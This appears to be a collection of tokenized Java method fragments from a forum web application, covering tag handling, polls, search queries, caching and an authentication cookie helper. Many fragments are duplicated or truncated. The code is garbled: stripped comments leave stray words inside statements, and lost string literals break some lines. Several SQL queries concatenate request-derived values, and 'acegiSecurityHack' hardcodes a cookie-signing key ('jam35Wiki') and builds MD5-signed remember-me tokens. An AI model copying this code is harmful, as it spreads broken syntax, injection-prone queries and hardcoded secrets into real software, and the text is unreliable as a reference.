public String toString ( ) { if ( tags = = null | | tags . isEmpty ( ) ) { return " " ; } String str = " " ; for ( String tag : tags ) { str + = ( str . length ( ) > 0 ? " , " : " " ) + tag ; } return str ; } 
public static void updateCounters ( Connection con , List < String > oldTags , List < String > newTags ) throws SQLException { PreparedStatement stInc = con . prepareStatement ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " ) ; PreparedStatement stDec = con . prepareStatement ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " ) ; if ( oldTags = = null ) { oldTags = Collections . emptyList ( ) ; } for ( String tag : newTags ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; stInc . setInt ( 1 , id ) ; stInc . executeUpdate ( ) ; } } for ( String tag : oldTags ) { if ( ! newTags . contains ( tag ) ) { 
public static List < String > parseTags ( String tags ) throws UserErrorException { Set < String > tagSet = new HashSet < String > ( ) ; tags = tags.replaceAll("\\|",","); String [] tagsArr = tags.split(","); if (tagsArr.length==0) { return Collections.emptyList(); } for (int i = 0; i < tagsArr.length; i++) { String tag = StringUtils.stripToNull(tagsArr[i].toLowerCase()); - if (tag==null) { continue; } : , , , <> checkTag(tag); tagSet.add(tag); } return new ArrayList<String>(tagSet); } 
public static void updateTags ( Connection con , int msgid , List < String > tagList ) throws SQLException { List < String > oldTags = Tags . getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( " ) " ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . toString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " tag= " + prof . getInt ( " tags " ) ; } 
public synchronized boolean check ( String ip , boolean trusted ) { cleanup ( trusted ) ; if ( hash . containsKey ( ip ) ) { return false ; } hash . put ( ip , new Date ( ) ) ; return true ; } 
public void checkDuplication ( String ip ) throws DuplicationException { if ( ! check ( ip , false ) ) { throw new DuplicationException ( ) ; 
public void checkDuplication ( String ip , boolean trusted ) throws DuplicationException { if ( ! check ( ip , trusted ) ) { throw new DuplicationException ( ) ; 
private synchronized void cleanup ( boolean trusted ) { Date current = new Date ( ) ; for ( Iterator < Map . Entry < String , Date > > i = hash . entrySet ( ) . iterator ( ) ; i . hasNext ( ) ; ) { Map . Entry < String , Date > entry = i . next ( ) ; 
public static Set < String > getTopTags ( Connection con ) throws SQLException { Set < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>5 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
public static List < String > parseTags ( String tags ) throws UserErrorException { Set < String > tagSet = new HashSet < String > ( ) ; tags = tags.replaceAll("\\|",","); String [] tagsArr = tags.split(","); if (tagsArr.length==0) { return Collections.emptyList(); } for (String aTagsArr : tagsArr) { String tag = StringUtils.stripToNull(aTagsArr.toLowerCase()); - if (tag == null) { continue; } : , , , <> checkTag(tag); tagSet.add(tag); } return new ArrayList<String>(tagSet); } 
public static Set < String > getTopTags ( Connection con ) throws SQLException { Set < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>1 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
public static String getTagLinks ( Connection con , int msgid ) throws SQLException { StringBuilder buf = new StringBuilder ( ) ; Tags tags = new Tags ( con , msgid ) ; ArrayList < String > mtags = tags . getTags ( ) ; if ( mtags . isEmpty ( ) ) { return " " ; } for ( String mtag : mtags ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } try { buf . append ( " <a href= \" view-news.jsp?section=1&amp;tag= " ) . append ( URLEncoder . encode ( mtag , " UTF-8 " ) ) . append ( " \" > " ) . append ( mtag ) . append ( " </a> " ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } } return buf . toString ( ) ; } 
public static List < Group > getGroups ( Connection db , Storage storage , Section section ) throws SQLException , StorageException , IOException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linkup, linktext, sections.name as sname, title, image, restrict_topics, sections.browsable,stat1,stat2,stat3,groups.id FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; group . updateInfo ( storage ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linkup = rs . getBoolean ( " linkup " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; } 
private void updateInfo ( Storage storage ) throws StorageException , IOException { info = storage . readMessageNull ( " grinfo " , String . valueOf ( id ) ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linkup, linktext, sections.name as sname, title, image, restrict_topics, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linkup = rs . getBoolean ( " linkup " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public static int createPoll ( Connection db , String title , List < String > pollList ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , title ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } Add new message } catch (PollNotFoundException ex) { throw new RuntimeException(ex); } return voteid; } 
public List < PollVariant > getPollVariants ( Connection db , int order ) throws SQLException { List < PollVariant > variants = new ArrayList < PollVariant > ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs ; switch ( order ) { case ORDER_ID : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY id " ) ; break ; case ORDER_VOTES : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY votes DESC, id " ) ; break ; default : throw new RuntimeException ( " Oops!? order= " + order ) ; } while ( rs . next ( ) ) { int varId = rs . getInt ( " id " ) ; String label = rs . getString ( " label " ) ; int votes = rs . getInt ( " votes " ) ; variants . add ( new PollVariant ( varId , label , votes ) ) ; } return variants ; } 
private int getMaxVote ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT max(votes) FROM votes WHERE vote= " + id ) ; rs . next ( ) ; int max = rs . getInt ( " max " ) ; if ( max = = 0 ) { max = 1 ; } rs . close ( ) ; st . close ( ) ; return max ; } 
public String renderPoll ( Connection db , Properties config , ProfileHashtable profile , int highlight ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( config . getProperty ( " HTMLPathPrefix " ) + profile . getString ( " style " ) + " /img/votes.gif " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( profile . getString ( " style " ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " top100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " toplist-main-button " ) ) ; } else { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " toplist-button " ) ) ; } out . append ( " </div> " ) ; Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.info("execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank,message " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery('linux') as q " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank,message " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank,message " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, section, topic, userid, rank, headline(message, q, 'HighlightAll=True') as headline FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public boolean getHover ( ) throws UtilException { return getProf ( ) . getBoolean ( " hover " ) ; } 
public ModelAndView handleRequest ( HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " section " ) ; } 
public static Connection getConnection ( ) throws SQLException { Connection db ; try { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor " ) ; if ( ds = = null ) { throw new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { throw new RuntimeException ( ex ) ; } return db ; } 
public static String getViewer ( Viewer viewer , Template tmpl , boolean nocache ) throws UtilException , SQLException , IOException , UserErrorException { return new ViewerCacher ( ) . get ( viewer , tmpl , nocache ) ; } 
public String get ( Viewer viewer , Template tmpl , boolean nocache ) throws UtilException , SQLException , IOException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( tmpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , BadDateException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws SQLException , UtilException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , UtilException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) throws Exception { int sectionid = new ServletParameterParser ( request ) . getInt ( " section " ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return session . getValue ( " corrector " ) ! = null ? ( Boolean ) session . getValue ( " corrector " ) : false ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ":" + expiryTime + ":" + password + ":" + key); String tokenValue = username + ":" + expiryTime + ":" + signatureValue; sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder(); String tokenValueBase64 = new String(encoder.encode(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
public boolean canCorrect ( ) { return corrector & & score > = CORRECTOR_SCORE ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return maxScore < CORRECTOR_SCORE ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ":" + expiryTime + ":" + password + ":" + key); String tokenValue = username + ":" + expiryTime + ":" + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { } } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ":" + expiryTime + ":" + password + ":" + key); String tokenValue = username + ":" + expiryTime + ":" + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " topics= " + prof . getInt ( " topics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) + " &tag= " + URLEncoder . encode ( tag ) ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " t= " + prof . getInt ( " topics " ) + " &m= " + prof . getInt ( " messages " ) + " &st= " + prof . getString ( " style " ) + " &tg= " + URLEncoder . encode ( tag ) ) ; if ( viewAll ) { id . append ( " &v-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &sec= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &grp= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &dlmt= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &lmt= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . toString ( ) ; } 
public void init ( FilterConfig filterConfig ) throws ServletException { this . filterConfig = filterConfig ; properties = getProperties ( filterConfig . getServletContext ( ) ) ; MemCachedSettings . setMainUrl ( properties . getProperty ( " MainUrl " ) ) ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) throws ServletException , IOException { if ( filterConfig = = null ) { return ; } try { Template tmpl = new Template ( ( HttpServletRequest ) servletRequest , properties , ( HttpServletResponse ) servletResponse ) ; servletRequest . setAttribute ( " template " , tmpl ) ; } catch ( Exception ex ) { logger . severe ( " Can't build Template " + StringUtil . getStackTrace ( ex ) ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr ) throws SQLException { return saveNewMessage ( db , remoteAddr , " " ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) throws SQLException { PreparedStatement pst = null ; PreparedStatement pstMsgbase = null ; try { allocation MSGID 
public boolean isSessionAuthorized ( ) { return isSessionAuthorized ( session ) ; } 
public static void resizeImage ( String filename , String iconname ) throws IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , " 200 " , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { throw new UtilException ( " Can't convert image: convert failed " ) ; 
public int calcTopicsCount ( Connection db , boolean showDeleted ) throws SQLException { Statement st = null ; try { st = db . createStatement ( ) ; 
public static Map < String , Integer > getAllTags ( Connection con ) throws SQLException { Map < String , Integer > map = new Hashtable < String , Integer > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values ORDER BY value " ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { map . put ( rs . getString ( " value " ) , rs . getInt ( " counter " ) ) ; } return map ; } 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
